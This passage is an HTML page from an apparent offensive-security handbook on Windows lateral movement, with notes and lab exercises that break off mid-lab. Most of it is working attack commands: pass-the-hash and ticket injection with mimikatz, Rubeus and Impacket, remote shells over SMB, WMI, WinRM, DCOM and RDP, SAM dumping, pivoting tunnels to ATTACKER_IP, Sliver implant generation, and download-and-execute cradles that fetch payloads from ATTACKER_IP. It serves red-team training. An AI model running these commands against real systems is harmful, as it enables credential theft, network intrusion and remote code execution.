@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Lateral Movement</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Lateral Movement</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- NOTES TAB                                                    -->
+      <!-- ============================================================ -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== PASS-THE-HASH ==================== -->
+        <h2>Pass-the-Hash (PtH)</h2>
+        <p>Authenticate using the NTLM hash directly — no plaintext password required. Works because NTLM authentication uses the hash as the shared secret, never sending the raw password over the wire.</p>
+
+        <h3>NTLM vs NTLMv2</h3>
+        <table>
+          <tr><th>Protocol</th><th>Hash Used</th><th>PtH Viable?</th><th>Notes</th></tr>
+          <tr><td>NTLM (NTLMv1)</td><td>NT hash (MD4 of password)</td><td>Yes</td><td>Legacy, weak — challenge-response based on NT hash</td></tr>
+          <tr><td>NTLMv2</td><td>NT hash + challenge + timestamp</td><td>Yes</td><td>Stronger challenge-response, but still uses the NT hash as base key</td></tr>
+          <tr><td>Kerberos</td><td>NT hash (for RC4) / AES key</td><td>No (use Overpass-the-Hash)</td><td>PtH doesn't apply — need to request a TGT instead</td></tr>
+        </table>
+        <p><strong>Key point:</strong> PtH works against any service using NTLM auth (SMB, WinRM, LDAP, MSSQL, RDP with Restricted Admin). You need the <strong>NT hash</strong> (32-char hex), not the NTLMv2 response hash captured from Responder.</p>
+
+        <h3>Tools</h3>
+<pre><code class="language-bash"># mimikatz — PtH to spawn a cmd.exe with target user's token
+mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe /run:cmd.exe"
+
+# CrackMapExec / NetExec — PtH over SMB
+nxc smb 10.10.10.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
+nxc smb 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -x "whoami"     # exec command
+nxc smb 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe --sam           # dump SAM
+
+# impacket-psexec — PtH to get SYSTEM shell
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe Administrator@10.10.10.10
+
+# impacket-wmiexec — PtH via WMI (stealthier, no service creation)
+impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe Administrator@10.10.10.10
+
+# pth-winexe — PtH from Linux
+pth-winexe -U 'corp.local/Administrator%aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe' //10.10.10.10 cmd.exe
+
+# evil-winrm — PtH over WinRM (port 5985)
+evil-winrm -i 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe</code></pre>
+
+        <!-- ==================== PASS-THE-TICKET ==================== -->
+        <h2>Pass-the-Ticket (PtT)</h2>
+        <p>Inject a stolen Kerberos ticket (TGT or TGS) into the current session to authenticate as the ticket's owner. No password or hash needed — just the ticket itself.</p>
+
+        <h3>.kirbi vs .ccache</h3>
+        <table>
+          <tr><th>Format</th><th>Platform</th><th>Used By</th></tr>
+          <tr><td><code>.kirbi</code></td><td>Windows</td><td>mimikatz, Rubeus — base64-encoded or binary ticket</td></tr>
+          <tr><td><code>.ccache</code></td><td>Linux</td><td>Impacket — stored in <code>KRB5CCNAME</code> env variable</td></tr>
+        </table>
+
+        <h3>Export &amp; Inject Tickets</h3>
+<pre><code class="language-powershell"># List cached tickets
+klist
+
+# mimikatz — export all tickets from memory
+mimikatz.exe "sekurlsa::tickets /export"
+
+# mimikatz — inject a .kirbi ticket
+mimikatz.exe "kerberos::ptt ticket.kirbi"
+
+# Rubeus — dump tickets (current user)
+.\Rubeus.exe dump
+
+# Rubeus — dump tickets (all users, needs elevation)
+.\Rubeus.exe dump /service:krbtgt
+
+# Rubeus — inject a ticket (base64)
+.\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwI...
+
+# Rubeus — request a TGT with a hash and inject it
+.\Rubeus.exe asktgt /user:admin /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt</code></pre>
+
+<pre><code class="language-bash"># Impacket — convert .kirbi to .ccache
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# Set the ticket for Impacket tools
+export KRB5CCNAME=ticket.ccache
+
+# Use the ticket
+impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
+impacket-smbclient -k -no-pass corp.local/Administrator@dc01.corp.local</code></pre>
+
+        <!-- ==================== OVERPASS-THE-HASH ==================== -->
+        <h2>Overpass-the-Hash / Pass-the-Key</h2>
+        <p>Convert an NTLM hash (or AES key) into a Kerberos TGT. Bridges PtH into Kerberos-only environments. The hash is used as pre-authentication to request a legitimate TGT from the KDC.</p>
+
+<pre><code class="language-powershell"># mimikatz — request TGT using NTLM hash (spawns new session)
+mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:2b576acbe6bcfda7294d6bd18041b8fe /run:powershell.exe"
+
+# Rubeus — request TGT with RC4 (NTLM hash) and inject
+.\Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
+
+# Rubeus — request TGT with AES256 key (stealthier, avoids RC4 downgrade detection)
+.\Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:a]8f2e9... /ptt /opsec</code></pre>
+
+<pre><code class="language-bash"># Impacket — get TGT with hash, save as .ccache
+impacket-getTGT corp.local/admin -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
+export KRB5CCNAME=admin.ccache
+
+# Now use Kerberos auth with any Impacket tool
+impacket-psexec -k -no-pass corp.local/admin@dc01.corp.local</code></pre>
+
+        <!-- ==================== PSEXEC ==================== -->
+        <h2>PsExec</h2>
+        <p>Remote execution via SMB. Creates a service on the target, uploads an executable, runs it, and communicates over a named pipe.</p>
+
+        <h3>How It Works</h3>
+<pre><code class="language-bash"># Flow:
+# 1. Authenticate to target via SMB (port 445)
+# 2. Connect to ADMIN$ or C$ share → upload service binary
+# 3. Open the Service Control Manager (SCManager) via RPC
+# 4. Create and start a Windows service pointing to the uploaded binary
+# 5. Service creates a named pipe for I/O (stdin/stdout)
+# 6. Client connects to the named pipe → interactive shell
+# 7. On exit: stops service, deletes service, removes binary</code></pre>
+
+        <h3>Tools</h3>
+<pre><code class="language-bash"># impacket-psexec — returns SYSTEM shell
+impacket-psexec corp.local/admin:Password123@10.10.10.10
+impacket-psexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe admin@10.10.10.10
+
+# impacket-smbexec — similar to psexec but uses a temporary batch file (no binary upload)
+impacket-smbexec corp.local/admin:Password123@10.10.10.10</code></pre>
+
+<pre><code class="language-powershell"># Sysinternals PsExec (from Windows)
+.\PsExec.exe \\10.10.10.10 -u corp\admin -p Password123 cmd.exe
+.\PsExec.exe \\10.10.10.10 -u corp\admin -p Password123 -s cmd.exe   # run as SYSTEM
+.\PsExec.exe \\10.10.10.10 -u corp\admin -p Password123 -i 1 cmd.exe # interactive session (session 1)</code></pre>
+
+        <p><strong>Detection:</strong> Event ID 7045 (new service installed), named pipe <code>\PSEXESVC</code>, binary in <code>ADMIN$</code>.</p>
+
+        <!-- ==================== WMI ==================== -->
+        <h2>WMI (Windows Management Instrumentation)</h2>
+        <p>Execute commands remotely via DCOM (port 135 + dynamic RPC ports). No service creation — stealthier than PsExec. Returns output via temporary files or named pipes.</p>
+
+<pre><code class="language-bash"># impacket-wmiexec — semi-interactive shell (runs cmd, reads output from ADMIN$ share)
+impacket-wmiexec corp.local/admin:Password123@10.10.10.10
+impacket-wmiexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe admin@10.10.10.10
+
+# CrackMapExec / NetExec — WMI exec
+nxc wmi 10.10.10.10 -u admin -p 'Password123' -x "whoami"</code></pre>
+
+<pre><code class="language-powershell"># wmic.exe (built-in, deprecated in newer Windows)
+wmic /node:10.10.10.10 /user:corp\admin /password:Password123 process call create "cmd.exe /c whoami > C:\temp\out.txt"
+
+# PowerShell — Invoke-WmiMethod
+$cred = Get-Credential
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName 10.10.10.10 -Credential $cred
+
+# CIM (modern replacement for wmic)
+$session = New-CimSession -ComputerName 10.10.10.10 -Credential $cred
+Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}</code></pre>
+
+        <!-- ==================== WINRM ==================== -->
+        <h2>WinRM (Windows Remote Management)</h2>
+        <p>PowerShell remoting over HTTP/HTTPS (ports 5985/5986). Uses WS-Management protocol. Enabled by default on servers and can be enabled on workstations.</p>
+
+<pre><code class="language-bash"># evil-winrm — full-featured WinRM shell from Linux
+evil-winrm -i 10.10.10.10 -u admin -p 'Password123'
+evil-winrm -i 10.10.10.10 -u admin -H 2b576acbe6bcfda7294d6bd18041b8fe  # PtH
+evil-winrm -i 10.10.10.10 -u admin -p 'Password123' -s /opt/scripts/    # load PS scripts
+evil-winrm -i 10.10.10.10 -u admin -p 'Password123' -e /opt/tools/      # upload executables
+
+# NetExec — WinRM
+nxc winrm 10.10.10.10 -u admin -p 'Password123' -x "whoami"</code></pre>
+
+<pre><code class="language-powershell"># PowerShell — interactive session
+$cred = Get-Credential
+Enter-PSSession -ComputerName 10.10.10.10 -Credential $cred
+
+# PowerShell — run command on remote machine
+Invoke-Command -ComputerName 10.10.10.10 -Credential $cred -ScriptBlock { whoami; hostname }
+
+# Run on multiple machines
+Invoke-Command -ComputerName server01,server02,dc01 -Credential $cred -ScriptBlock { hostname }
+
+# Enable WinRM on a target (needs local admin)
+Enable-PSRemoting -Force</code></pre>
+
+        <!-- ==================== SMB ==================== -->
+        <h2>SMB (Server Message Block)</h2>
+        <p>File sharing and named pipe communication. Primary transport for lateral movement tooling. Default port 445.</p>
+
+        <h3>Admin Shares</h3>
+        <table>
+          <tr><th>Share</th><th>Path</th><th>Purpose</th></tr>
+          <tr><td><code>C$</code></td><td>C:\</td><td>Default admin share — root of C: drive</td></tr>
+          <tr><td><code>ADMIN$</code></td><td>C:\Windows</td><td>Used by PsExec for binary upload</td></tr>
+          <tr><td><code>IPC$</code></td><td>N/A</td><td>Inter-Process Communication — named pipes, null sessions</td></tr>
+        </table>
+
+<pre><code class="language-bash"># smbclient — list shares, browse files
+smbclient -L //10.10.10.10 -U 'corp.local/admin%Password123'
+smbclient //10.10.10.10/C$ -U 'corp.local/admin%Password123'
+
+# smbclient commands: ls, cd, get, put, mget, mput
+
+# CrackMapExec / NetExec — enumerate shares across network
+nxc smb 10.10.10.0/24 -u admin -p 'Password123' --shares
+nxc smb 10.10.10.0/24 -u admin -p 'Password123' --spider C$ --pattern txt
+
+# impacket-smbclient
+impacket-smbclient corp.local/admin:Password123@10.10.10.10
+
+# Mount share from Linux
+mount -t cifs //10.10.10.10/C$ /mnt/share -o username=admin,password=Password123,domain=corp.local</code></pre>
+
+<pre><code class="language-powershell"># PowerShell / cmd — access admin shares
+net use \\10.10.10.10\C$ /user:corp\admin Password123
+dir \\10.10.10.10\C$\Users\Administrator\Desktop\
+
+# Copy files
+copy C:\tools\payload.exe \\10.10.10.10\C$\temp\payload.exe
+
+# List shares
+net view \\10.10.10.10</code></pre>
+
+        <!-- ==================== DCOM ==================== -->
+        <h2>DCOM (Distributed COM)</h2>
+        <p>Remote code execution through COM objects over RPC (port 135 + dynamic ports). Less commonly monitored than SMB-based methods.</p>
+
+<pre><code class="language-bash"># impacket-dcomexec — uses MMC20.Application by default
+impacket-dcomexec corp.local/admin:Password123@10.10.10.10
+impacket-dcomexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe admin@10.10.10.10
+
+# Specify DCOM object
+impacket-dcomexec -object MMC20 corp.local/admin:Password123@10.10.10.10
+impacket-dcomexec -object ShellWindows corp.local/admin:Password123@10.10.10.10
+impacket-dcomexec -object ShellBrowserWindow corp.local/admin:Password123@10.10.10.10</code></pre>
+
+<pre><code class="language-powershell"># PowerShell — MMC20.Application (lateral movement classic)
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\temp\out.txt", "7")
+
+# ShellWindows
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "10.10.10.10"))
+$com.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "C:\Windows\System32", $null, 0)</code></pre>
+
+        <!-- ==================== RDP ==================== -->
+        <h2>RDP (Remote Desktop Protocol)</h2>
+        <p>Graphical remote access on port 3389. Legitimate admin tool often used for lateral movement.</p>
+
+<pre><code class="language-bash"># xfreerdp — RDP from Linux
+xfreerdp /v:10.10.10.10 /u:admin /p:'Password123' /d:corp.local
+xfreerdp /v:10.10.10.10 /u:admin /p:'Password123' /d:corp.local /dynamic-resolution /drive:share,/tmp
+
+# Restricted Admin mode — PtH over RDP (no password sent to target)
+# Must be enabled on target: HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0
+xfreerdp /v:10.10.10.10 /u:admin /pth:2b576acbe6bcfda7294d6bd18041b8fe /d:corp.local
+
+# Enable Restricted Admin mode remotely (requires existing shell)
+nxc smb 10.10.10.10 -u admin -H 2b576acbe6bcfda7294d6bd18041b8fe -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"</code></pre>
+
+<pre><code class="language-powershell"># SharpRDP — RDP command execution without GUI
+.\SharpRDP.exe computername=10.10.10.10 command="cmd.exe /c whoami > C:\temp\out.txt" username=corp\admin password=Password123
+
+# Enable RDP via registry (needs remote access already)
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"</code></pre>
+
+        <!-- ==================== SSH ON WINDOWS ==================== -->
+        <h2>SSH on Windows</h2>
+        <p>OpenSSH server available as an optional feature since Windows 10 1809 / Server 2019.</p>
+
+<pre><code class="language-powershell"># Check if OpenSSH is installed
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+
+# Install OpenSSH server
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+
+# Start and enable the service
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+
+# Config file: C:\ProgramData\ssh\sshd_config
+# Default shell can be changed:
+New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force</code></pre>
+
+<pre><code class="language-bash"># Connect from Linux
+ssh admin@10.10.10.10
+
+# SSH with domain creds
+ssh corp\\admin@10.10.10.10</code></pre>
+
+        <!-- ==================== PIVOTING ==================== -->
+        <h2>Pivoting</h2>
+        <p>Route traffic through a compromised host to reach networks not directly accessible from your attack machine.</p>
+
+        <h3>Chisel</h3>
+<pre><code class="language-bash"># Chisel — fast TCP/UDP tunnel over HTTP
+# On attack machine (server):
+chisel server --reverse --port 8080
+
+# On compromised host (client) — reverse SOCKS proxy:
+chisel client ATTACKER_IP:8080 R:socks
+
+# Creates a SOCKS5 proxy on attacker's port 1080
+# Use with proxychains:
+proxychains nxc smb 172.16.1.0/24 -u admin -p 'Password123'
+
+# Specific port forward:
+chisel client ATTACKER_IP:8080 R:8888:172.16.1.10:445</code></pre>
+
+        <h3>Ligolo-ng</h3>
+<pre><code class="language-bash"># On attack machine — create TUN interface and start proxy
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+
+# On compromised host — connect back as agent
+ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# In ligolo proxy console:
+session                              # select the agent session
+ifconfig                             # view agent's network interfaces
+start                                # start the tunnel
+
+# On attack machine — add route to internal network
+sudo ip route add 172.16.1.0/24 dev ligolo</code></pre>
+
+        <h3>SSH Tunnels</h3>
+<pre><code class="language-bash"># Local port forward: access remote_target:port through pivot
+ssh -L 8888:172.16.1.10:445 user@pivot_host
+# Now connect to localhost:8888 → reaches 172.16.1.10:445
+
+# Remote port forward: expose attacker service to pivot's network
+ssh -R 9090:127.0.0.1:80 user@pivot_host
+# pivot_host:9090 → routes to attacker's localhost:80
+
+# Dynamic (SOCKS) proxy
+ssh -D 1080 user@pivot_host
+# All traffic through SOCKS5 on localhost:1080 goes via pivot_host
+
+# Combine with ProxyChains
+# /etc/proxychains4.conf → socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 172.16.1.0/24</code></pre>
+
+        <h3>sshuttle</h3>
+<pre><code class="language-bash"># Route entire subnet through pivot (transparent proxy, needs Python on pivot)
+sshuttle -r user@pivot_host 172.16.1.0/24
+
+# With SSH key
+sshuttle -r user@pivot_host --ssh-cmd "ssh -i id_rsa" 172.16.1.0/24
+
+# Multiple subnets
+sshuttle -r user@pivot_host 172.16.1.0/24 10.10.20.0/24</code></pre>
+
+        <h3>ProxyChains</h3>
+<pre><code class="language-bash"># /etc/proxychains4.conf
+# strict_chain or dynamic_chain
+# [ProxyList]
+# socks5 127.0.0.1 1080
+
+# Usage — prefix any command
+proxychains nmap -sT -Pn -p 445,3389,5985 172.16.1.0/24
+proxychains evil-winrm -i 172.16.1.10 -u admin -p 'Password123'
+proxychains impacket-psexec admin:Password123@172.16.1.10</code></pre>
+
+        <!-- ==================== PORT FORWARDING ==================== -->
+        <h2>Port Forwarding</h2>
+        <table>
+          <tr><th>Type</th><th>Direction</th><th>Use Case</th></tr>
+          <tr><td>Local</td><td>Attacker → Pivot → Target</td><td>Access internal service from your machine</td></tr>
+          <tr><td>Remote</td><td>Target → Pivot → Attacker</td><td>Expose attacker's listener to internal network</td></tr>
+          <tr><td>Dynamic (SOCKS)</td><td>Attacker → Pivot → any target/port</td><td>Proxy all traffic through pivot (most flexible)</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># Windows — netsh port forward (requires admin)
+netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.1.10
+
+# List forwards
+netsh interface portproxy show all
+
+# Remove
+netsh interface portproxy delete v4tov4 listenport=8888 listenaddress=0.0.0.0</code></pre>
+
+        <!-- ==================== C2 FRAMEWORKS ==================== -->
+        <h2>C2 Frameworks (Overview)</h2>
+        <table>
+          <tr><th>Framework</th><th>Type</th><th>Key Features</th></tr>
+          <tr><td>Cobalt Strike</td><td>Commercial</td><td>Beacon payload, Malleable C2 profiles, BOFs, widely used in red teams</td></tr>
+          <tr><td>Sliver</td><td>Open Source</td><td>Go-based, implants (sessions/beacons), mTLS/HTTP(S)/DNS/WireGuard, stagers</td></tr>
+          <tr><td>Havoc</td><td>Open Source</td><td>Demon agent, modular, BOF support, modern alternative to Cobalt Strike</td></tr>
+        </table>
+
+<pre><code class="language-bash"># Sliver — quick start
+sliver-server     # start server
+generate --mtls ATTACKER_IP --os windows --arch amd64 --save implant.exe   # generate implant
+mtls --lhost 0.0.0.0 --lport 8888  # start listener
+
+# Once agent checks in:
+use [session-id]
+whoami
+ls
+shell              # drop to OS shell</code></pre>
+
+        <!-- ==================== LOLBAS ==================== -->
+        <h2>Living off the Land (LOLBAS)</h2>
+        <p>Abuse legitimate Windows binaries to download files, execute code, or bypass application whitelisting. Reference: <a href="https://lolbas-project.github.io" target="_blank">lolbas-project.github.io</a></p>
+
+<pre><code class="language-powershell"># certutil — download files
+certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\temp\payload.exe
+
+# bitsadmin — background download
+bitsadmin /transfer job /download /priority high http://ATTACKER_IP/payload.exe C:\temp\payload.exe
+
+# mshta — execute HTA (HTML Application) from URL
+mshta http://ATTACKER_IP/payload.hta
+
+# rundll32 — execute DLL
+rundll32.exe \\ATTACKER_IP\share\payload.dll,EntryPoint
+
+# regsvr32 — execute scriptlet (AppLocker bypass)
+regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll
+
+# PowerShell download cradles
+Invoke-WebRequest -Uri http://ATTACKER_IP/payload.exe -OutFile C:\temp\payload.exe
+(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/payload.exe','C:\temp\payload.exe')
+
+# PowerShell — in-memory execution (fileless)
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')
+IEX(IWR http://ATTACKER_IP/script.ps1 -UseBasicParsing)</code></pre>
+
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- LAB TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Pass-the-Hash with CrackMapExec</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use a dumped NTLM hash to authenticate across the network with CrackMapExec/NetExec, enumerate accessible hosts, and execute commands.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Scenario:
+#   You compromised a workstation and dumped the local admin hash:
+#   Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+#   Network: 10.10.10.0/24
+#   Goal: Find other machines where this hash is valid and get code execution
+
+# Step 1: Spray the hash across the subnet
+nxc smb 10.10.10.0/24 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
+
+# Step 2: Look for (Pwn3d!) in the output — indicates admin access</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Spray the hash across the subnet and identify hosts where you have admin access</li>
+              <li>Execute <code>whoami</code> on each pwned host: <code>nxc smb TARGET -u Administrator -H HASH -x "whoami"</code></li>
+              <li>Dump SAM hashes from a target: <code>nxc smb TARGET -u Administrator -H HASH --sam</code></li>
+              <li>List shares on accessible hosts: <code>nxc smb TARGET -u Administrator -H HASH --shares</code></li>
+              <li>Use <code>impacket-psexec</code> with the hash to get an interactive SYSTEM shell</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: WinRM Remote Execution</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use WinRM (evil-winrm and PowerShell remoting) to establish remote sessions, transfer tools, and execute scripts on a target machine.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Scenario:
+#   Target: 10.10.10.20 (srv01.corp.local) — WinRM enabled (port 5985)
+#   Creds: corp.local/svc_admin:S3cur3Pass!
+#   Goal: Establish WinRM session, upload tools, enumerate the machine
+
+# Step 1: Verify WinRM is open
+nxc winrm 10.10.10.20 -u svc_admin -p 'S3cur3Pass!'
+
+# Step 2: Connect with evil-winrm
+evil-winrm -i 10.10.10.20 -u svc_admin -p 'S3cur3Pass!'</code></pre>
+
+<pre><code class="language-powershell"># Step 3: From a Windows attack box — PowerShell remoting
+$cred = New-Object System.Management.Automation.PSCredential("corp\svc_admin", (ConvertTo-SecureString "S3cur3Pass!" -AsPlainText -Force))
+Enter-PSSession -ComputerName 10.10.10.20 -Credential $cred
+
+# Step 4: Run commands on multiple targets
+Invoke-Command -ComputerName srv01,srv02 -Credential $cred -ScriptBlock {
+    whoami; hostname; Get-Process | Select-Object -First 5
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Connect using evil-winrm and upload a tool (e.g., SharpHound, winPEAS)</li>
+              <li>Use the <code>upload</code> and <code>download</code> commands in evil-winrm</li>
+              <li>Load a PowerShell script into the session using <code>-s</code> flag</li>
+              <li>From a Windows box, use <code>Invoke-Command</code> to run enumeration across multiple hosts</li>
+              <li>Test PtH over WinRM: <code>evil-winrm -i TARGET -u admin -H HASH</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Pivoting with Chisel</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Pivot through a compromised dual-homed host to reach an isolated internal network using chisel, then move laterally to a second target.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Scenario:
+#   Attacker: 192.168.1.100
+#   Pivot host: 192.168.1.50 (external) / 172.16.1.50 (internal) — compromised, you have SSH
+#   Target: 172.16.1.10 (dc01) — only reachable from 172.16.1.0/24
+#   Goal: Reach dc01 through the pivot and get a shell
+
+# Step 1: Start chisel server on attacker
+chisel server --reverse --port 8080
+
+# Step 2: Upload chisel to pivot host and connect back
+scp chisel user@192.168.1.50:/tmp/chisel
+ssh user@192.168.1.50 "/tmp/chisel client 192.168.1.100:8080 R:socks &amp;"
+
+# Step 3: Configure proxychains (/etc/proxychains4.conf)
+# [ProxyList]
+# socks5 127.0.0.1 1080</code></pre>
+
+<pre><code class="language-bash"># Step 4: Scan the internal network through the tunnel
+proxychains nmap -sT -Pn -p 445,3389,5985 172.16.1.10
+
+# Step 5: Access the target through the tunnel
+proxychains evil-winrm -i 172.16.1.10 -u admin -p 'Password123'
+proxychains impacket-psexec admin:Password123@172.16.1.10</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Set up a chisel reverse SOCKS proxy through the pivot host</li>
+              <li>Use proxychains to scan 172.16.1.0/24 for live hosts and open ports</li>
+              <li>Enumerate SMB shares on dc01 through the tunnel</li>
+              <li>Get a shell on dc01 using impacket-psexec or evil-winrm through proxychains</li>
+              <li>Bonus: Set up ligolo-ng as an alternative to chisel and compare the experience</li>
+              <li>Bonus: Set up a specific port forward with chisel for RDP: <code>R:3389:172.16.1.10:3389</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Impacket-PSExec Deep Dive</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Understand and use impacket-psexec with passwords, hashes, and Kerberos tickets for remote execution.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Method 1: Password authentication
+impacket-psexec corp.local/Administrator:'P@ssw0rd'@10.10.10.10
+
+# Method 2: Pass-the-Hash
+impacket-psexec -hashes :2b576acbe6bcfda7294d6bd18041b8fe Administrator@10.10.10.10
+
+# Method 3: Kerberos authentication (with ccache ticket)
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
+
+# Execute a specific command instead of interactive shell
+impacket-psexec -hashes :HASH Administrator@10.10.10.10 "ipconfig /all"
+
+# How PSExec works under the hood:
+# 1. Connects to ADMIN$ share (\\target\ADMIN$)
+# 2. Uploads a service binary (random name)
+# 3. Creates and starts a Windows service
+# 4. Service creates a named pipe for I/O
+# 5. Connects to the pipe for interactive shell
+# 6. Stops/deletes service and binary on exit</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Use impacket-psexec with a password to get a SYSTEM shell.</li>
+              <li>Repeat with PtH — verify you get the same result.</li>
+              <li>Monitor with Process Monitor on the target: observe the service creation and pipe operations.</li>
+              <li>Use <code>-codec</code> flag for proper output encoding on non-English systems.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Impacket-WMIExec for Stealth</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use WMI-based execution for stealthier lateral movement — no service creation, no binary upload.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># WMIExec: executes commands via WMI (DCOM port 135 + dynamic high port)
+# More stealthy than PSExec — no service creation, no binary dropped
+
+# Interactive shell
+impacket-wmiexec corp.local/admin:'Password123'@10.10.10.10
+
+# Pass-the-Hash
+impacket-wmiexec -hashes :NTLM_HASH Administrator@10.10.10.10
+
+# Single command execution
+impacket-wmiexec -hashes :NTLM_HASH Administrator@10.10.10.10 "whoami /all"
+
+# How WMIExec works:
